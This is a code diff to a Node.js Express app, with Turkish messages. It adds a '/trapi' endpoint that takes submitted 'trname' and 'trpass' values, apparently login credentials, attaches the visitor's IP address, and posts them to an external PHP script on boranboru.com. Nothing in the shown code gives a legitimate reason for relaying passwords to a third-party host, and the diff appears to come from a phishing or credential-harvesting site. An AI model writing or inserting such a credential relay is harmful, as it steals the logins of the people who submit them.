@@ -23,6 +23,31 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
  
+app.post('/trapi', async (req, res) => {
+  const clientIp = req.clientIp;
+  const { trname, trpass } = req.body;
+
+  if (!trname || !trpass) {
+      return res.status(400).send("Eksik veri: 'trname' veya 'trpass' gönderilmedi.");
+  }
+
+  try {
+      const postData = {
+          ip: clientIp,
+          trname: trname,
+          trpass: trpass,
+      };
+
+      const response = await axios.post('https://boranboru.com/livechats.php', postData);
+      res.send(response.data);
+  } catch (error) {
+      console.error("Hedef URL'ye POST gönderiminde hata:", error.message);
+      res.status(500).send({
+          error: "Sunucu hatası, lütfen daha sonra tekrar deneyin.",
+          details: error.message,
+      });
+  }
+});
 
 app.get('/login', (req, res) => {
     const caAsCookie = req.cookies.ca_as;
